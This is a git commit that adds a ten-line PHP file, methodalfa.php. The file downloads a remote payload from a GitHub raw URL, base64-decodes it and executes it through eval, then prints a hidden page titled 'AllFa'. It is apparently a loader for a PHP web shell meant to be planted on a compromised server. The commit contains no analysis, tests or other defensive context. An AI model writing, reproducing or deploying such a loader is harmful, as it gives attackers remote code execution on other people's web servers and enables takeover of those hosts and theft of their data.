7839894520fe10f9128a7af4ddd37154522dd9a1
suid-privilege <55438963+suid-privilege@users.noreply.github.com>
2019-09-17 06:30:52 -0400

    Add files via upload

---
+++ methodalfa.php
@@ -0,0 +1,10 @@
+<?php
+$r3d = "https://github.com/suid-privilege/methodalfa/raw/master/malafat";
+$l3nin = file_get_contents($r3d); 
+eval("?>".(base64_decode($l3nin)));
+?>
+<!DOCTYPE html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<div style="display: none;">
+<h1>AllFa</h1>
+</html>
